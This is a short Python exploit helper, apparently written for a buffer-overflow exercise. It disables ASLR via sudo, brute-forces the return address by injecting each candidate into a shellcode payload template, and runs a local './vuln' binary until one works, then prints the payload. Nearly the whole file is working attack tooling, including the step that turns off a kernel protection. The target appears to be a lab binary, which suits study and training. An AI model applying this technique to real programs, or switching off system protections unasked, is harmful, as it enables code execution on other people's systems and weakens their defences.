#!/usr/bin/python3
#
# shellcode_injection_find_rip.py
#
# v0.0.1 - 2021-09-20 - nelbren@nelbren.com
#

import os
import sys
import struct
import shutil
import binascii
import fileinput
import subprocess

def ASLR(enable):
    label = 'Address Space Layout Randomization (ASLR)'
    proc = '/proc/sys/kernel/randomize_va_space'
    command = f'cat {proc}'
    code = int(subprocess.check_output(command, shell=True).decode().rstrip())
    if enable:
        if code:
            print(f'{label} is ON, nothing to do.')
        else:
            print(f'{label} is OFF, i will turn ON...', end='', flush=True)
            code = os.system(f'echo 2 | sudo dd of={proc}')
            if not code:
                print('OK')
            else:
                print('FAILED!')
    else:
        if code:
            print(f'{label} is ON, i will turn OFF...', end='', flush=True)
            code = os.system(f'echo 0 | sudo dd of={proc}')
            if not code:
                print('OK')
            else:
                print('FAILED!')
                exit(1)
        else:
            print(f'{label} is OFF, nothing to do.')

if len(sys.argv) != 3:
    print(f'Use {sys.argv[0]} 0xBEGINADDRESS 0xENDADDRESS')
    exit(2)
begin = int(sys.argv[1], 16)
end = int(sys.argv[2], 16)
#begin = 0x7fffffffe310
#end = 0x7fffffffe390
#print(int(begin))
#print(int(end))
#exit(1)

vuln = './vuln'
if not os.path.isfile(vuln) and not os.access(vuln, os.X_OK):
    print(f'Please build before {vuln}')
    exit(1)

ASLR(False)

original = 'shellcode_injection_template.py'
target = 'shellcode_injection_test.py'

for i in range(begin, end):
    addr = struct.pack('<Q', i).hex()
    RIP = addr[0:12]
    shutil.copyfile(original, target)
    for line in fileinput.input('shellcode_injection_test.py', inplace=True):
       print(line.replace('CHANGE-ME', RIP), end='')
    print('Trying ' + RIP + '...')
    code = os.system(f'{vuln} $(python3 shellcode_injection_test.py)')
    if code in [32512, 33280]:
        print('RIP FOUND:\n', RIP)
        print('PAYLOAD:')
        os.system('python3 ./shellcode_injection_test.py > shellcode_injection_test.bin')
        os.system('xxd shellcode_injection_test.bin')
        break

ASLR(True)
